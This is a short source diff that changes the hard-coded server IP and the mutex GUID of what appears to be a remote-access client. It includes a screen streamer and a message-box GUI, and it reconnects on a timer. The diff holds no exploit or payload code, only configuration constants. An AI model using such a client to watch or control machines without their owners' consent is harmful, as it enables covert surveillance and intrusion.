@@ -18,13 +18,13 @@
 #include "box_message/MessageBoxGUI.h"
 #include "screen/ScreenStreamer.h"
 
-#define IP "192.168.1.133"
+#define IP "192.168.82.182"
 
 #define PORT 3055
 
 #define TAG_NAME "Client"
 
-#define MUTEX "8c7a9de4-9b7e-4a9b-a1d7-739acb255c9b"
+#define MUTEX "0e1bba6c-a3b5-4b3a-9bb5-32e68005b840"
 
 #define TIMING_RETRY 10000
 
